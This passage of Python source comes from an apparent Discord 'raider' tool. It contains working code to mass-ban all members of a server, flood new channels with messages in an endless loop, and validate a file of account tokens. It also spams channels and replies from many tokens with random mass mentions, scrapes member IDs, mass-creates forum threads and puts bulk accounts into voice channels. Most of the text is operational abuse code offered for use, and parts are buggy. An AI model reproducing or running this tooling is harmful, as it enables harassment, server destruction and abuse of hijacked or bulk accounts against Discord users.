                print(S+f"["+G+"+"+S+f"] Created Role #{role.name} [{role.id}]")
              except:
                print(S+f"["+R+"-"+S+f"] Could Not Created Channel #{role.name} [{role.id}]")
                print(S+f"["+R+"-"+S+f"] Could Not Created Role #{role.name} [{role.id}]")
        @client.command()
        async def allban(ctx):
              await ctx.message.delete()
              try:
                member=ctx.message.guild.members
                await member.ban(ctx.message.guild, reason="All BAN")
                print(S+f"["+G+"+"+S+f"] @{member.name} [{member.id}] was banned.")
              except:
                print(S+f"["+R+"-"+S+f"] @{member.name} [{member.id}] was could not banned.")
        @client.event
        async def on_guild_channel_create(channel):
            while True:
              await asyncio.sleep(0.00034)
              try:
                await channel.send(messages)
                print(S+f"["+G+"+"+S+f"] Sent Message [Text: {messages}] #{channel.name} [{channel.id}]")
              except:
                print(S+f"["+R+"-"+S+f"] Not Sent Message [Text: {messages}] #{channel.name} [{channel.id}]")
        client.run(token)
     def TokenChecker():
            setTitle(f"Token Checker | ") 
            os.system("cls")
            print(f'\n{S}[{S}{G}+{S}] Loading Tokens:\n')
            sleep(0.5)
            def success(text): lock.acquire(); print(f"[{G}+{S}] {G}Vaid TOKEN {S}{text}{S}"); lock.release(); sleep(0.6)
            def invalid(text): lock.acquire(); print(f"[{R}-{S}] {R}InVaid TOKEN {R} {text}{S}"); lock.release(); sleep(0.6)

            with open("tokens.txt", "r") as f: tokens = f.read().splitlines() 
            def save_tokens():
                with open("tokens.txt", "w") as f: f.write("")
                for token in tokens:
                    with open("tokens.txt", "a") as f: f.write(token + "\n")
            def removeDuplicates(file):
                lines_seen = set()
                with open(file, "r+") as f:
                    d = f.readlines(); f.seek(0)
                    for i in d:
                        if i not in lines_seen: f.write(i); lines_seen.add(i)
                    f.truncate()
            def check_token(token:str):
                sleep(0.878)
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": token,
                    "cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="},
                timeout=5)
                if response.status_code == 200: success(f"| {token} res: {response.text}")
                else: tokens.remove(token); invalid(f"| {token} res: {response.text}")
            def check_tokens():
                threads=[]
                for token in tokens:
                    try:threads.append(threading.Thread(target=check_token, args=(token,)))
                    except Exception as e: pass
                for thread in threads: thread.start()
                for thread in threads: thread.join()
            def start():
                removeDuplicates("tokens.txt")
                check_tokens()
                save_tokens()
                sleep(0.6)
            start()
            print(f'\n\n{S}[{S}{G}+{S}] 全てのtokenをチェックしました (tokens.txtは生存しているtokenだけに変更されました)')
            sleep(1)
            input(f'{S}[{S}{G}+{S}] Press ENTER: ')
            Menu()
     def Spammer():
            setTitle("Spammer | ")
            session=requests.Session()
            os.system("cls")
            messages = open("messages.txt","r",encoding="utf-8_sig").read()
            allchannels = input(f"{S}[{G}+{S}] All Channels {S}[{B}y{S}/{B}n{S}] {lr}> {Y}")
            delay = float(input(f"{S}[{G}+{S}] delay (int) {lr}> {Y}"))
            if allchannels=="y":
                guild_id  = input(f"{S}[{G}+{S}] Server Id {lr}> {Y}")
                channel_id = input(f"{S}[{G}+{S}] Channel Id {lr}> {Y}")
                token = input(f"{S}[{G}+{S}] Token (Channel Feching) {lr}> {Y}")
                chlist = _def_.get_channels(token,int(guild_id))
            if allchannels=="n":
                guild_id  = input(f"{S}[{G}+{S}] Server Id {lr}> {Y}")
                channel_id = input(f"{S}[{G}+{S}] Channel Id {lr}> {Y}")
                token = input(f"{S}[{G}+{S}] Token {lr}> {Y}")
            randoms = int(input(f"{S}[{G}+{S}] Random Mention(0は無し) {lr}> {Y}"))
            randomleng = int(input(f"{S}[{G}+{S}] Random Length {lr}> {Y}"))
            if randoms > 0:
                token = input(f"{S}[{G}+{S}] Token (Member Feching) {lr}> {Y}")
                bot = discum.Client(token=token, log=False)
                def close_after_fetching(resp, guild_id):
                    if bot.gateway.finishedMemberFetching(guild_id):
                        bot.gateway.removeCommand({
                            "function": close_after_fetching,
                            "params": {
                                "guild_id": guild_id
                            }
                        })
                        bot.gateway.close()

                def get_members(guild_id, channel_id):
                    bot.gateway.fetchMembers(
                        guild_id, channel_id, keep="all",
                        wait=1)  #get all user attributes, wait 1 second between requests
                    bot.gateway.command({
                        "function": close_after_fetching,
                        "params": {
                            "guild_id": guild_id
                        }
                    })
                    bot.gateway.run()
                    bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                    return bot.gateway.session.guild(guild_id).members
                members = get_members(guild_id, channel_id)
                memberslist = []
                for memberID in members:
                    print(f"{S}[{G}+{S}] メンバーを取得しました。ID: {Y}{memberID}")
                    memberslist.append(memberID)      
                def memberspam():
                    spams = ""
                    with open("tokens.txt") as f:
                            lines = f.readlines()
                            while True:
                                messages = open("messages.txt","r",encoding="utf-8_sig").read()
                                for l in lines:
                                    try:
                                        for _ in range(randoms):
                                            spams += f"<@{random.choice(memberslist)}> "
                                        token=l.rstrip("\n")
                                        num_random="".join(random.choice(string.digits) for _ in range(4))
                                        randomize = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(randomleng))
                                        payload = {"content": f"{messages} | {spams} | {randomize} | {num_random}"}
                                        headers = {"authorization": token}
                                        session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        print(f"{S}[{G}+{S}] {R}{token}{S} was Send {S}[{G}{messages} | {spams} | {randomize} | {num_random}{S}]")
                                        spams=""
                                    except Exception as e:
                                        print(f"{S}[{R}-{S}] {R}Error: {R}{e}{S}")
                def allch_memberspam():
                    i=0
                    spams = ""
                    with open("tokens.txt") as f:
                            lines = f.readlines()
                            while True:
                                messages = open("messages.txt","r",encoding="utf-8_sig").read()
                                for l in lines:
                                    try:
                                        for _ in range(randoms):
                                            spams += f"<@{random.choice(memberslist)}> "
                                        token=l.rstrip("\n")
                                        channel_id = random.choice(chlist)
                                        num_random="".join(random.choice(string.digits) for _ in range(4))
                                        randomize = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(randomleng))
                                        payload = {"content": f"{messages} | {spams} | {randomize} | {num_random}"}
                                        headers = {"authorization": token}
                                        session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        print(f"{S}[{G}+{S}] {R}{token}{S} was Send {S}[{G}{messages} | {spams} | {randomize} | {num_random}{S}]")
                                        spams=""
                                    except Exception as e:
                                        print(f"{S}[{R}-{S}] {R}Error: {R}{e}{S}")
                while True:
                    sleep(delay)
                    if allchannels=="n":
                        threading.Thread(target=memberspam).start()
                    if allchannels=="y":
                        threading.Thread(target=allch_memberspam).start()
            else:
                def normalspam():
                    i=0
                    with open("tokens.txt") as f:
                            lines = f.readlines()
                            while True:
                                messages = open("messages.txt","r",encoding="utf-8_sig").read()
                                for l in lines:
                                    try:
                                        token=l.rstrip("\n")
                                        num_random="".join(random.choice(string.digits) for _ in range(4))
                                        randomize = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(randomleng))
                                        payload = {"content": f"{messages} | {randomize} | {num_random}"}
                                        headers = {"authorization": token}
                                        session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        print(f"{S}[{G}+{S}] {R}{token}{S} was Send: {S}[{G}{messages} | {randomize} | {num_random}{S}]")
                                    except Exception as e:
                                        print(f"{S}[{R}-{S}] {R}Error: {R}{e}{S}")
                def allch_normalspam():
                    i=0
                    with open("tokens.txt") as f:
                            lines = f.readlines()
                            while True:
                                messages = open("messages.txt","r",encoding="utf-8_sig").read()
                                for l in lines:
                                    try:
                                        token=l.rstrip("\n")
                                        channel_id = random.choice(chlist)
                                        num_random="".join(random.choice(string.digits) for _ in range(4))
                                        randomize = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(randomleng))
                                        payload = {"content": f"{messages} | {randomize} | {num_random}"}
                                        headers = {"authorization": token}
                                        session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        print(f"{S}[{G}+{S}] {R}{token}{S} was Send: {S}[{G}{messages} | {randomize} | {num_random}{S}]")
                                    except Exception as e:
                                        print(f"{S}[{R}-{S}] {R}Error: {R}{e}{S}")
                while True:
                    sleep(delay)
                    if allchannels=="n":
                        threading.Thread(target=normalspam).start()
                    if allchannels=="y":
                        threading.Thread(target=allch_normalspam).start()
     def ReplySpammer():
            setTitle("Reply Spammer | ")
            session=requests.Session()
            os.system("cls")
            messages = open("messages.txt","r",encoding="utf-8_sig").read()
            delay = float(input(f"{S}[{G}+{S}] delay (int) {lr}> {Y}"))
            guild_id  = input(f"{S}[{G}+{S}] Server Id {lr}> {Y}")
            channel_id = input(f"{S}[{G}+{S}] Channel Id {lr}> {Y}")
            message_id = input(f"{S}[{G}+{S}] Message Id {lr}> {Y}")
            randoms = int(input(f"{S}[{G}+{S}] Random Mention(0は無し) {lr}> {Y}"))
            randomleng = int(input(f"{S}[{G}+{S}] Random Length {lr}> {Y}"))  
            if randoms > 0:
                token = input(f"{S}[{G}+{S}] Token {lr}> {Y}")
                bot = discum.Client(token=token, log=False)
                def close_after_fetching(resp, guild_id):
                    if bot.gateway.finishedMemberFetching(guild_id):
                        bot.gateway.removeCommand({
                            "function": close_after_fetching,
                            "params": {
                                "guild_id": guild_id
                            }
                        })
                        bot.gateway.close()

                def get_members(guild_id, channel_id):
                    bot.gateway.fetchMembers(
                        guild_id, channel_id, keep="all",
                        wait=1)  #get all user attributes, wait 1 second between requests
                    bot.gateway.command({
                        "function": close_after_fetching,
                        "params": {
                            "guild_id": guild_id
                        }
                    })
                    bot.gateway.run()
                    bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                    return bot.gateway.session.guild(guild_id).members
                members = get_members(guild_id, channel_id)
                memberslist = []
                for memberID in members:
                    print(f"{S}[{G}+{S}] メンバーを取得しました。ID: {Y}{memberID}")
                    memberslist.append(memberID)
                def memberspam():
                    spams = ""
                    with open("tokens.txt") as f:
                            lines = f.readlines()
                            while True:
                                messages = open("messages.txt","r",encoding="utf-8_sig").read()
                                for l in lines:
                                    try:
                                        for _ in range(randoms):
                                            spams += f"<@{random.choice(memberslist)}> "
                                        token=l.rstrip("\n")
                                        randomize = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(randomleng))
                                        payload = {"content": f"{messages} | {spams} | {randomize}","message_reference":{"guild_id":f"{guild_id}","channel_id":f"{channel_id}","message_id":f"{message_id}"}}
                                        headers = {"authorization": token}
                                        session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        print(f"{S}[{G}+{S}] {R}{token}{S} was Send {S}[{G}{messages} | {spams} | {randomize}{S}]")
                                        spams=""
                                    except Exception as e:
                                        print(f"{S}[{R}-{S}] {R}Error: {R}{e}{S}")
                while True:
                    sleep(delay)
                    threading.Thread(target=memberspam).start()
            else:
                def normalspam():
                    with ThreadPoolExecutor(max_workers=4) as executor:
                        with open("tokens.txt") as f:
                            lines = f.readlines()
                            while True:
                                messages = open("messages.txt","r",encoding="utf-8_sig").read()
                                for l in lines:
                                    randomize = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(randomleng))
                                    try:
                                        payload = {"content": f"{messages} | {randomize}","message_reference":{"guild_id":f"{guild_id}","channel_id":f"{channel_id}","message_id":f"{message_id}"}}
                                        headers = {"authorization": l.rstrip("\n")}
                                        session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        print(f"{S}[{G}+{S}] {R}{token}{S} was Send: {S}[{G}{messages} | {randomize}{S}]")
                                    except Exception as e:
                                        print(f"{S}[{R}-{S}] {R}Error: {R}{e}{S}")
                while True:
                    sleep(delay)
                    threading.Thread(target=normalspam).start()
     def Credits():
        os.system("cls")
        print(f"{S}{R}                         [{S}{R}+{S}{R}]{S}{R}-------------------------------------------------------{S}{R}[{S}{G}+{S}{R}]")
        print("""
                         ░█████╗░██╗░░░██╗░█████╗░██╗░░░██╗░░░░░░██████╗░░█████╗░██╗██████╗░███████╗██████╗░
                         ██╔══██╗██║░░░██║██╔══██╗██║░░░██║░░░░░░██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
                         ███████║██║░░░██║███████║██║░░░██║█████╗██████╔╝███████║██║██║░░██║█████╗░░██████╔╝
                         ██╔══██║██║░░░██║██╔══██║██║░░░██║╚════╝██╔══██╗██╔══██║██║██║░░██║██╔══╝░░██╔══██╗
                         ██║░░██║╚██████╔╝██║░░██║╚██████╔╝░░░░░░██║░░██║██║░░██║██║██████╔╝███████╗██║░░██║
                         ╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
                         """)
        print(f"{S}{G}\n                         Creators {S}> {S}{G}Rea#1234 {lr}and ☆にゃにゃっこ☆{G}")
        print(f"{S}{G}\n                         Creators Discord Servers {S}> {S}{R}Rea#1234{S}{G}\n\n                         LINKS{S} > {S}{B}https://discord.gg/fmdW5uPmHQ\n")
        print(f"{S}{R}                         [{S}{R}+{S}{R}]{S}{R}-------------------------------------------------------{S}{R}[{S}{G}+{S}{R}]")
        input()
        Menu()
     def TokenInfo():
        os.system("cls")
        token = input(f"{S}[{G}+{S}] token {lr}> {Y}")
        _def_.Info(token)
        input(f"\n{S}[{S}{G}+{S}] Press ENTER: ")
        Menu()
     def scrapper():
                setTitle(f"Member ID Scraper | ")
                os.system("cls")
                token = input(f"{S}[{G}+{S}] Account Token: ")
                guild_id = input(f"{S}[{G}+{S}] Server ID: ")
                channel_id = input(f"{S}[{G}+{S}] Channel Id {lr}> {Y}")
                bot = discum.Client(token=token, log=False)
                def close_after_fetching(resp, guild_id):
                    if bot.gateway.finishedMemberFetching(guild_id):
                        bot.gateway.removeCommand({
                            "function": close_after_fetching,
                            "params": {
                                "guild_id": guild_id
                            }
                        })
                        bot.gateway.close()

                def get_members(guild_id, channel_id):
                    bot.gateway.fetchMembers(
                        guild_id, channel_id, keep="all",
                        wait=1)  #get all user attributes, wait 1 second between requests
                    bot.gateway.command({
                        "function": close_after_fetching,
                        "params": {
                            "guild_id": guild_id
                        }
                    })
                    bot.gateway.run()
                    bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                    return bot.gateway.session.guild(guild_id).members
                members = get_members(guild_id, channel_id)
                memberslist = []
                for memberID in members:
                    print(f"{S}[{G}+{S}] メンバーを取得しました。ID: {Y}{memberID}")
                    with open("data/massmention.txt", "a") as f:
                        f.write(f"<@{memberID}>\n")
                    memberslist.append(memberID)
                print(f"\n{S}[{S}{G}+{S}] idのスクラップが完了しました \n(メンバーは、スパム用に適切なファイルに既に配置されています![data/massmention.txt])")
                sleep(1)
                input(f"\n{S}[{S}{G}+{S}] Press ENTER: ")
                Menu()
     def VoiceJoiner():
        setTitle(f"Voice Joiner | ")
        os.system("cls")
        channel_id = int(input(f"{S}[{S}{G}+{S}] Voice Channel ID: "))
        guild_id = int(input(f"{S}[{S}{G}+{S}] Server ID: "))
        music = input(f"{S}[{G}+{S}] ON Music? [{B}data/music.ogg{S}] [{B}y{S}/{B}n{S}] :")
        deaf = input(f"{S}[{S}{G}+{S}] Defean: (y/n)? ")
        if deaf=="y":
          deaf = True
        if deaf=="n":
            deaf = False
        mute = input(f"{S}[{S}{G}+{S}] Mute: (y/n)? ")
        if mute=="y":
          mute = True
        if mute=="n":
            mute = False
        video = input(f"{S}[{S}{G}+{S}] Video: (y/n)? ")
        if video=="y":
          video = True
        if video=="n":
            video = False
        def join(token):
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
            ws.send(json.dumps({
                "op":2,
                    "d": {
                        "token": token,
                        "properties": {
                            "$os": "Discord Android",
                            "$browser": "Discord Android",
                            "$device": "Discord Android",},
                        "presence": {
                            "game": {
                                "name": "auau Raider"
                            },
                            "status": "online",
                            "since": 0,
                            "activities": [],
                            "afk": True,},},
                    "s": None,
                    "t": None,})
            )
            ws.send(json.dumps({
                            "op": 4,
                            "d": {
                                "guild_id": guild_id,
                                "channel_id": channel_id,
                                "self_mute": deaf,
                                "self_deaf": mute,
                                "self_video": video}})
            )        
        with open("tokens.txt") as f:
            lines = f.readlines()
            for l in lines:    
                tokens = l.rstrip("\n")
                threading.Thread(target=join, args=[tokens]).start()
            Menu()
     def ThreadsCreator():
        setTitle("Threads Creator | ")
        os.system("cls")
        with open("tokens.txt", "r") as handle:
            i = handle.readlines()
            for tokns in i:
                token = tokns.rstrip("\n")
        forum_count = int(input(f"{S}[{G}+{S}] {R}Create Forum {Y}Count {lr}> "))
        forum_id = input(f"{S}[{G}+{S}] {R}Forum {Y}Id {lr}> ")
        forum_name = input(f"{S}[{G}+{S}] {R}Forum {Y}Name {lr}> ")
        forum_message = input(f"{S}[{G}+{S}] {R}Forum {Y}Message {lr}> ")
        with open("tokens.txt") as f:
            lines = f.readlines()
            while int(0)<int(forum_count):
                for l in lines:
                    try:
                        headers = {"authorization": l.rstrip("\n")}
                        res = session.post(f"https://discord.com/api/v9/channels/{forum_id}/threads?use_nested_fields=true", headers=headers, json={
                                                                                                                                                            "name": forum_name+" | "+"".join(random.choice(string.ascii_letters + string.digits) for _ in range(13)),
                                                                                                                                                            "message": {
                                                                                                                                                            "content": forum_message+" | "+"".join(random.choice(string.ascii_letters + string.digits) for _ in range(13))
                                                                                                                                                            }})
                        print(f"{S}[{G}+{S}] {R}{token} {S}was created Forum [Response: {R}: {G}{res.text}{S}{S})")
                        f.write(f"{res}\n")
                    except Exception as e:
                        print(f"{S}[{R}-{S}] Error: {e}")
     def ThreadsDeleter():
        setTitle("Threads Deleter | ")
        os.system("cls")
        with open("data/threads.txt") as handle:
          for _ in range(len(open("data/threads.txt").readlines())):
            forum_ids=handle.readlines()
            for forum_id in forum_ids:
                    forum_id=forum_ids.rstrip("\n")
                    try:
                        headers = {
                            "authorization": token
                        }
                        res = session.delete(f"https://discord.com/api/v9/channels/{forum_id}", headers=headers)
                        print(f"{S}[{G}+{S}] {R}{token} {S}was deleted Forum [Response: {R}: {G}{res.text}{S}{S})")
                        f=open("data/threads", "a")
                        f.write(f"{res}\n")
                        input(f"{S}[{G}+{S}] Enterを入力:")
                        Menu()
                        os.remove("data/threads.txt")
                    except Exception as e:
                        print(f"{S}[{R}-{S}] Error: {e}")
                        input(f"{S}[{G}+{S}] Enterを入力:")
                        Menu()
     def Threads():
        setTitle("Threads | ")
        os.system("cls")
        options=input(f"""
{S}[{M}1{S}] {G}Forum Threads Creator
{S}[{M}2{S}] {R}Forum Threads Deleter
\n           {M}> {Y} """)
        if options=="1":
            module.ThreadsCreator()
        if options=="2":
            module.ThreadsDeleter()
     def TokenOnliner():
            setTitle("Token Onliner | ")
            os.system("cls")
            ne=input(f"{S}[{G}+{S}] name {lr}> {Y}")
            ds=input(f"{S}[{G}+{S}] details {lr}> {Y}")
            se=input(f"{S}[{G}+{S}] states {lr}> {Y}")
            config = {
                "details": ds,
                "state": se,
                "name": ne,
            }

            class Onliner:
                def __init__(self, token) -> None:
                    self.token    = token
                    self.statuses = ["online", "idle", "dnd"]

                def __online__(self):
                    ws = websocket.WebSocket()
                    ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
                    response = ws.recv()
                    event = json.loads(response)
                    heartbeat_interval = int(event["d"]["heartbeat_interval"]) / 1000
                    ws.send(
                        json.dumps(
                            {
                                "op": 2,
                                "d": {
                                    "token": self.token,
                                    "properties": {
                                        "$os": sys.platform,
                                        "$browser": "RTB",
                                        "$device": f"{sys.platform} Device",
                                    },
                                    "presence": {
                                        "game": {
                                            "name": config["name"],
                                            "type": 0,
                                            "details": config["details"],
                                            "state": config["state"],
                                        },
                                        "status": random.choice(self.statuses),
                                        "since": 0,
                                        "activities": [],
                                        "afk": False,
                                    },
                                },
                                "s": None,
                            "t": None,
                            }
                        )
                    )

                    print(f"[{g}+{w}] Online | {self.token}")

                    while True:
                        heartbeatJSON = {
                            "op": 1, 
                            "token": self.token, 
                            "d": "null"
                        }
                        ws.send(json.dumps(heartbeatJSON))
                        sleep(heartbeat_interval)
            threading.Thread(target=Onliner(token).__online__).start()
            sleep(2)
            input(f"{S}[{S}{G}+{S}] Press ENTER: ")
            Menu()
     def Exit():
        os.system("cls")
        sys.exit()
     def GuildNickChange():
        setTitle(f"Server Nickname Changer | ")
        os.system("cls")
        guild_id = input(f"{S}[{G}+{S}] Server Id {lr}> {S}")
        session=requests.Session()
        with open("tokens.txt") as f:
                lines = f.readlines()
                for l in lines:
                        token=l.rstrip("\n")
                        def changenick(token):
                            try:
                                nicks=nick()
                                payload = {"nick": nicks}
                                headers = {"authorization": token,"content-type": "application/json","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"}
                                session.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me/nick", headers=headers, json=payload)
                                print(f"{S}[{G}+{S}] {G}Success Change {S}[{R}{token}{S}] {S}[{G}{nicks}{S}]")
                            except Exception as e:
                                print(f"{S}[{R}-{S}] {R}Error: {e}{S}[{R}{token}{S}]")
                        with ThreadPoolExecutor(max_workers=4) as executor:
                            executor.submit(changenick, token)
                        sleep(0)
    if option=="1":
        module.leaver()
    if option=="2":
        module.HeadSquads()
    if option=="3":
        module.botnuker()
    if option=="4":
        module.webhookSpammer()
    if option=="5":
        module.TokenChecker()
    if option=="6":
        module.Spammer()
    if option=="7":
        print(f"Comming Soon")
    if option=="8":
        module.ReplySpammer()
    if option=="9":
        module.AccNuker()
    if option=="10":
        module.TokenInfo()
    if option=="11":
        print(f"Comming soon")
    if option=="12":
        module.VoiceJoiner()
    if option=="13":
        module.Threads()         
    if option=="14":
        module.GuildNickChange()
    if option=="15":
        module.TokenOnliner()
    if option=="16":
        print(f"NONE")
    if option=="17":
        module.Credits()
    if option=="18":
        module.Exit()
Menu()